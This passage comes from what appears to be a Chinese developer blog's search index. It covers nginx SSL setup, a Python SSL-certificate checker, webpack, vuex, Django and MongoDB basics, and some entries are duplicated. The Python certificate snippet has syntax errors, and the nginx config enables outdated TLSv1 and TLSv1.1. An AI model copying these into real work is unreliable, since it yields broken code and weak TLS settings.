server_name www.example.com; # 改为绑定证书的域名</span><br><span class="line">        # ssl 配置</span><br><span class="line">        ssl on;</span><br><span class="line">        ssl_certificate 1_www.example.com.crt; # 改为自己申请得到的 crt 文件的名称</span><br><span class="line">        ssl_certificate_key 2_www.example.com.key; # 改为自己申请得到的 key 文件的名称</span><br><span class="line">        ssl_session_timeout 5m;</span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        # WebSocket 配置</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://127.0.0.1:8765;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>修改完成后重启<code>nginx</code>:<br>&#96;&#96; bash<br>nginx -s reload<br>&#96;&#96;&#96;</p>]]></content>
      
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站服务状态及ssl证书状态在线检测工具</title>
      <link href="/2018/03/17/%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E7%8A%B6%E6%80%81%E5%8F%8Assl%E8%AF%81%E4%B9%A6%E7%8A%B6%E6%80%81%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/"/>
      <url>/2018/03/17/%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E7%8A%B6%E6%80%81%E5%8F%8Assl%E8%AF%81%E4%B9%A6%E7%8A%B6%E6%80%81%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>为了检测多个网站及检测网站ssl证书有效性，写了一个在线测试检测工具。</p><span id="more"></span><h5 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h5><p>自由添加和编辑站点信息 <br>单选及多选检测 <br>支持http和https检测    <br>当有ssl证书时，检测证书的有效状态以及过期时间   <br>查看检测历史 </p><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>python3 node-8.9.1 </p><h5 id="框架及数据库"><a href="#框架及数据库" class="headerlink" title="框架及数据库"></a>框架及数据库</h5><p>后端：<code>tornado </code> <br>前端：<code>vue</code><br>数据库：<code>mongo</code></p><h5 id="http检测状态实现原理"><a href="#http检测状态实现原理" class="headerlink" title="http检测状态实现原理"></a>http检测状态实现原理</h5><p>通过 python <code>requests</code> 库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    web_url = <span class="string">&#x27;http://...&#x27;</span></span><br><span class="line">    <span class="comment"># timeout - 请求超时时间</span></span><br><span class="line">    r = requests.get(web_url, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;请求成功&#x27;</span>)</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出错误原因</span></span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br></pre></td></tr></table></figure><h5 id="https-检测状态及ssl证书状态测试实现原理"><a href="#https-检测状态及ssl证书状态测试实现原理" class="headerlink" title="https 检测状态及ssl证书状态测试实现原理"></a>https 检测状态及ssl证书状态测试实现原理</h5><p>运用 <code>socket</code> 库建立连接，<code>ssl</code>库获取ssl证书的公钥，在通过<code>openssl</code>的<code>crypto</code>通过公钥解密获取ssl证书里的信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> OpenSSL <span class="keyword">import</span> crypto</span><br><span class="line"></span><br><span class="line">web_url = <span class="string">&#x27;https://...&#x27;</span></span><br><span class="line"><span class="comment"># ssl.PROTOCOL_TLS - ssl支持协议</span></span><br><span class="line">context = ssl.SSLContext(ssl.PROTOCOL_TLS)</span><br><span class="line"><span class="comment"># 建立 socket 连接   </span></span><br><span class="line"><span class="comment"># socket.AF_INET 为 IPv4 网络协议的套接字类型</span></span><br><span class="line">sock = socket.socket(socket.AF_INET)</span><br><span class="line"><span class="comment"># 设置超时时间 10s</span></span><br><span class="line">sock.settimeout(<span class="number">10</span>)</span><br><span class="line">wrappedSocket = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=web_url</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    wrappedSocket.connect(web_url, <span class="number">443</span>))</span><br><span class="line">    <span class="comment"># 获取 ssl 证书公钥</span></span><br><span class="line">    pem_cert = ssl.DER_cert_to_PEM_cert(wrappedSocket.getpeercert(<span class="literal">True</span>))</span><br><span class="line">    wrappedSocket.close()</span><br><span class="line">    <span class="comment"># 解密公钥</span></span><br><span class="line">    io_cert = crypto.load_certificate(crypto.FILETYPE_PEM, pem_cert)</span><br><span class="line">    <span class="comment"># 证书过期时间</span></span><br><span class="line">    ssl_time = io_cert.get_notAfter().decode()[:-<span class="number">1</span>]</span><br><span class="line">    ssl_not_after = ssl_time[<span class="number">0</span>:<span class="number">4</span>] + <span class="string">&#x27;年&#x27;</span> + ssl_time[<span class="number">4</span>:<span class="number">6</span>] + <span class="string">&#x27;月&#x27;</span> + ssl_time[<span class="number">6</span>:<span class="number">8</span>] + <span class="string">&#x27;日&#x27;</span> + ssl_time[<span class="number">8</span>:<span class="number">10</span>] + <span class="string">&#x27;时&#x27;</span> + ssl_time[<span class="number">10</span>:<span class="number">12</span>] + <span class="string">&#x27;分&#x27;</span> + ssl_time[<span class="number">12</span>:<span class="number">14</span>] + <span class="string">&#x27;秒&#x27;</span></span><br><span class="line">    <span class="comment"># 证书有效状态</span></span><br><span class="line">    ssl_expired = io_cert.has_expired()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接失败，输出错误原因</span></span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br></pre></td></tr></table></figure><h5 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h5><p>1.<code>webpack</code>打包时遇到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are using the runtime-only build of Vue <span class="built_in">where</span> the template compiler is not available. Either pre-compile the templates into render <span class="built_in">functions</span>, or use the compiler-included build. </span><br></pre></td></tr></table></figure><p>解决办法，在<code>webpack</code>配置中增加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">        <span class="attr">vue</span>: <span class="string">&#x27;vue/dist/vue.js&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h5><blockquote><p>ssl — TLS&#x2F;SSL wrapper for socket objects - <a href="https://docs.python.org/3.2/library/ssl.html#ssl.SSLSocket.getpeercert">https://docs.python.org/3.2/library/ssl.html#ssl.SSLSocket.getpeercert</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> vue </tag>
            
            <tag> webpack </tag>
            
            <tag> tornado </tag>
            
            <tag> ssl </tag>
            
            <tag> mongo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习 webpack</title>
      <link href="/2018/03/11/%D1%A7%CF%B0-webpack/"/>
      <url>/2018/03/11/%D1%A7%CF%B0-webpack/</url>
      
        <content type="html"><![CDATA[<h5 id="learn-webpack"><a href="#learn-webpack" class="headerlink" title="learn-webpack"></a>learn-webpack</h5><p>学习webpack</p><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>node 8.9.1<br>npm 5.7.1<br>webpack 4   </p><h5 id="script"><a href="#script" class="headerlink" title="script"></a>script</h5><p>开发模式 - npm run dev<br>打包 - npm run build<br>运行打包后的文件 - npm run server   </p><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><ol><li>多入口 html - 配置入口 <code>config/entry.json</code>   </li><li>base64 处理limit限制以下的图片   </li><li>css预处理    </li><li>dev模式下热重载  </li><li>babel-loader 转es5</li><li>image-webpack-loader 压缩图片    </li><li>SplitChunksPlugin 提取公共js</li><li>postcss-loader 自动增加css3前缀</li><li>html-withimg-loader 增加html识别图片路径</li><li>分类css img js 到不同的文件夹中</li></ol><p><a href="https://github.com/ElijahZheng/learn-webpack.git">github传送门</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习 webpack</title>
      <link href="/2018/03/11/%E5%AD%A6%E4%B9%A0-webpack/"/>
      <url>/2018/03/11/%E5%AD%A6%E4%B9%A0-webpack/</url>
      
        <content type="html"><![CDATA[<h5 id="learn-webpack"><a href="#learn-webpack" class="headerlink" title="learn-webpack"></a>learn-webpack</h5><p>学习webpack</p><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>node 8.9.1<br>npm 5.7.1<br>webpack 4   </p><h5 id="script"><a href="#script" class="headerlink" title="script"></a>script</h5><p>开发模式 - npm run dev<br>打包 - npm run build<br>运行打包后的文件 - npm run server   </p><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><ol><li>多入口 html - 配置入口 <code>config/entry.json</code>   </li><li>base64 处理limit限制以下的图片   </li><li>css预处理    </li><li>dev模式下热重载  </li><li>babel-loader 转es5</li><li>image-webpack-loader 压缩图片    </li><li>SplitChunksPlugin 提取公共js</li><li>postcss-loader 自动增加css3前缀</li><li>html-withimg-loader 增加html识别图片路径</li><li>分类css img js 到不同的文件夹中</li></ol><p><a href="https://github.com/ElijahZheng/learn-webpack.git">github传送门</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django 实现登录，注册，用 Pillow 添加验证码</title>
      <link href="/2018/02/13/django-%E5%AE%9E%E7%8E%B0%E7%99%BB%E5%BD%95%EF%BC%8C%E6%B3%A8%E5%86%8C%EF%BC%8C%E7%94%A8-Pillow-%E6%B7%BB%E5%8A%A0%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
      <url>/2018/02/13/django-%E5%AE%9E%E7%8E%B0%E7%99%BB%E5%BD%95%EF%BC%8C%E6%B3%A8%E5%86%8C%EF%BC%8C%E7%94%A8-Pillow-%E6%B7%BB%E5%8A%A0%E9%AA%8C%E8%AF%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>用 Django 作为后端，Django 有自己的一套登录和注册方式（User Model），可以对 User Model 进行扩展，新作一张表 user_ext 。</p><p>然后用 Pillow 生成验证码，防止刷用户注册。</p><p><a href="https://github.com/ElijahZheng/django-register.git">github 传送门</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> django </tag>
            
            <tag> pillow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习 vuex</title>
      <link href="/2018/02/13/%D1%A7%CF%B0-vuex/"/>
      <url>/2018/02/13/%D1%A7%CF%B0-vuex/</url>
      
        <content type="html"><![CDATA[<p>vuex 可以用来帮助我们管理全局的状态，以音乐播放器来举例。我们在播放音乐的时候，需要将音乐的信息保存到全局变量中，然后当点击其他页面的时候，音乐的信息保存有，就可以在其他页面自由切换，不至于点到其他页面的时候之前播放的音乐的信息就没有了。当想调用音乐信息的时候，从全局变量中调出即可。</p><p><a href="https://github.com/ElijahZheng/learn-vuex.git">github 传送门</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> vuex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习 vuex</title>
      <link href="/2018/02/13/%E5%AD%A6%E4%B9%A0-vuex/"/>
      <url>/2018/02/13/%E5%AD%A6%E4%B9%A0-vuex/</url>
      
        <content type="html"><![CDATA[<p>vuex 可以用来帮助我们管理全局的状态，以音乐播放器来举例。我们在播放音乐的时候，需要将音乐的信息保存到全局变量中，然后当点击其他页面的时候，音乐的信息保存有，就可以在其他页面自由切换，不至于点到其他页面的时候之前播放的音乐的信息就没有了。当想调用音乐信息的时候，从全局变量中调出即可。</p><p><a href="https://github.com/ElijahZheng/learn-vuex.git">github 传送门</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> vuex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 学习</title>
      <link href="/2018/01/29/MongoDB-%D1%A7%CF%B0/"/>
      <url>/2018/01/29/MongoDB-%D1%A7%CF%B0/</url>
      
        <content type="html"><![CDATA[<p>1.进入数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mongo</span></span><br></pre></td></tr></table></figure><p>不进行任何操作的时候，默认使用的数据库为<code>test</code></p><p>2.创建或切换数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">use learndb</span></span><br><span class="line">switched to db learndb</span><br></pre></td></tr></table></figure><span id="more"></span><p>3.查看存在的数据库（只显示有数据的数据库）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show databases</span> </span><br><span class="line">or</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show dbs</span></span><br><span class="line">admin    0.000GB</span><br><span class="line">config   0.000GB</span><br></pre></td></tr></table></figure><p>当向数据库<code>learndb</code>中插入数据时，<code>show dbs</code>才会显示<code>learndb</code>。</p><p>4.查看当前使用的数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db</span></span><br><span class="line">learndb</span><br></pre></td></tr></table></figure><p>5.删除当前的数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br><span class="line">&#123; &quot;ok&quot; : 1 &#125;</span><br></pre></td></tr></table></figure><p>6.创建数据库集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.createCollection(<span class="string">&#x27;myCol&#x27;</span>)</span></span><br><span class="line">&#123; &quot;ok&quot; : 1 &#125;</span><br></pre></td></tr></table></figure><p>创建时可以带参数<code>options</code></p><p>options参数是可选的，因此只需要指定集合的名称。 以下是可以使用的选项列表：</p><table><thead><tr><th>字段</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>capped</td><td>Boolean</td><td>(可选)如果为true，则启用封闭的集合。上限集合是固定大小的集合，它在达到其最大大小时自动覆盖其最旧的条目。 如果指定true，则还需要指定size参数。</td></tr><tr><td>autoIndexId</td><td>Boolean</td><td>(可选)如果为true，则在_id字段上自动创建索引。默认值为false。</td></tr><tr><td>size</td><td>数字</td><td>(可选)指定上限集合的最大大小(以字节为单位)。 如果capped为true，那么还需要指定此字段的值。</td></tr><tr><td>max</td><td>数字</td><td>(可选)指定上限集合中允许的最大文档数。</td></tr></tbody></table><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.createCollection(<span class="string">&quot;myCol2&quot;</span>, &#123;capped : <span class="literal">true</span>, autoIndexId : <span class="literal">true</span>, size : 6142800, max : 10000 &#125;)</span></span><br><span class="line">&#123;</span><br><span class="line">&quot;note&quot; : &quot;the autoIndexId option is deprecated and will be removed in a future release&quot;,</span><br><span class="line">&quot;ok&quot; : 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7.查看创建的集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show collections</span></span><br><span class="line">myCol</span><br><span class="line">myCol2</span><br></pre></td></tr></table></figure><p>8.删除指定的集合 <code>db.collection.drop()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol2.drop()</span></span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>9.插入文档 <code>db.collection.insert(&#123;&#125;)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.insert(&#123;</span></span><br><span class="line">title: &#x27;learn mongodb&#x27;, </span><br><span class="line">url: &#x27;https://blog.zhengxiangling.com&#x27;,</span><br><span class="line">    view: &#x27;99&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br></pre></td></tr></table></figure><p>其他插入方法</p><ul><li>db.post.save(document)</li><li>db.collection.insertOne()</li><li>db.collection.insertMany()</li></ul><p></p><p>10.查询集合 <code>db.collection.find()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.find()</span></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;), &quot;title&quot; : &quot;learn mongodb&quot;, &quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;, &quot;view&quot; : &quot;99&quot; &#125;</span><br></pre></td></tr></table></figure><p>结合<code>preey()</code>方法，格式化输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.find().pretty()</span></span><br><span class="line">&#123;</span><br><span class="line">&quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;),</span><br><span class="line">&quot;title&quot; : &quot;learn mongodb&quot;,</span><br><span class="line">&quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;,</span><br><span class="line">&quot;view&quot; : &quot;99&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加参数的查找</p><table><thead><tr><th>操作</th><th>语法</th><th>示例</th><th>RDBMS等效语句</th></tr></thead><tbody><tr><td>相等</td><td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;by&quot;:&quot;yiibai&quot;&#125;).pretty()</code></td><td><code>where by = &#39;yiibai&#39;</code></td></tr><tr><td>小于</td><td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$lt:50&#125;&#125;).pretty()</code></td><td><code>where likes &lt; 50</code></td></tr><tr><td>小于等于</td><td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$lte:50&#125;&#125;).pretty()</code></td><td><code>where likes &lt;= 50</code></td></tr><tr><td>大于</td><td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$gt:50&#125;&#125;).pretty()</code></td><td><code>where likes &gt; 50</code></td></tr><tr><td>大于等于</td><td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$gte:50&#125;&#125;).pretty()</code></td><td><code>where likes &gt;= 50</code></td></tr><tr><td>不等于</td><td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$ne:50&#125;&#125;).pretty()</code></td><td><code>where likes != 50</code></td></tr></tbody></table><p>结合<code>and</code>或者<code>or</code>查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">db.mycol.find(</span></span><br><span class="line">   &#123;</span><br><span class="line">      $and: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">db.mycol.find(</span></span><br><span class="line">   &#123;</span><br><span class="line">      $or: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure><p>设置查找到的文档要显示出的字段，如只显示<code>_id</code>和<code>title</code>，<code>1</code>表示显示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.mycol.find(&#123;&#125;, &#123;&#x27;_id&#x27;:1, &#x27;title&#x27;:1&#125;)</span><br></pre></td></tr></table></figure><p>11.更新文档 <code>update</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.update(&#123;title: <span class="string">&#x27;learn mongodb&#x27;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;title: <span class="string">&#x27;update title&#x27;</span>&#125;&#125;)</span></span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br></pre></td></tr></table></figure><p>默认只会修改匹配到的第一个文档，若要修改所有匹配到的文档，将参数<code>multi</code>设置为<code>true</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.update(&#123;title: <span class="string">&#x27;learn mongodb&#x27;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;title: <span class="string">&#x27;update title&#x27;</span>&#125;, &#123;multi: <span class="literal">true</span>&#125;&#125;)</span></span><br></pre></td></tr></table></figure><p>12.删除文档 <code>remove</code></p><p>删除匹配到的所有文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;)</span><br></pre></td></tr></table></figure><p>如果想只删除匹配到的第一条文档，加参数<code>1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;, 1)</span><br></pre></td></tr></table></figure><p>把集合下的所有文档都删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.remove()</span><br></pre></td></tr></table></figure><p>13.限制记录数 <code>limit()</code>,<code>skip()</code><br>比如查询到的记录有10条，只想要前5条，可以用<code>limit()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.find().limit(5)</span><br></pre></td></tr></table></figure><p>比如查询出的数据，不想要前3条，可以调过前三条的文档，可以用<code>skip()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.find().skip(3)</span><br></pre></td></tr></table></figure><p>14.排序记录 <code>sort</code><br>可以多查询出的文档记录进行排序,<code>1</code>代表升序，<code>-1</code>代表降序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.find().sort(&#123;&#x27;_id&#x27;: 1&#125;)</span><br><span class="line"></span><br><span class="line">db.myCol.find().sort(&#123;&#x27;_id&#x27;: -1&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Mongo DB </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 学习</title>
      <link href="/2018/01/29/MongoDB-%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/01/29/MongoDB-%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>1.进入数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mongo</span></span><br></pre></td></tr></table></figure><p>不进行任何操作的时候，默认使用的数据库为<code>test</code></p><p>2.创建或切换数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">use learndb</span></span><br><span class="line">switched to db learndb</span><br></pre></td></tr></table></figure><span id="more"></span><p>3.查看存在的数据库（只显示有数据的数据库）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show databases</span> </span><br><span class="line">or</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show dbs</span></span><br><span class="line">admin    0.000GB</span><br><span class="line">config   0.000GB</span><br></pre></td></tr></table></figure><p>当向数据库<code>learndb</code>中插入数据时，<code>show dbs</code>才会显示<code>learndb</code>。</p><p>4.查看当前使用的数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db</span></span><br><span class="line">learndb</span><br></pre></td></tr></table></figure><p>5.删除当前的数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br><span class="line">&#123; &quot;ok&quot; : 1 &#125;</span><br></pre></td></tr></table></figure><p>6.创建数据库集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 